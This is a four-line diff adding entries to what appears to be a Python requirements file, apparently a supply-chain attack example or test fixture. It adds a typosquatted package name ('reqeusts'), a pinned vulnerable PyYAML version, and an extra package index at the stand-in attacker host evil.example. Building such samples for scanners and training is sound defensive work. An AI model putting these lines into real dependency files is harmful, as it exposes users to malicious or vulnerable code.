@@ -1,0 +1,4 @@
+requests
+reqeusts
+pyyaml==5.3.1
+--extra-index-url https://evil.example/simple
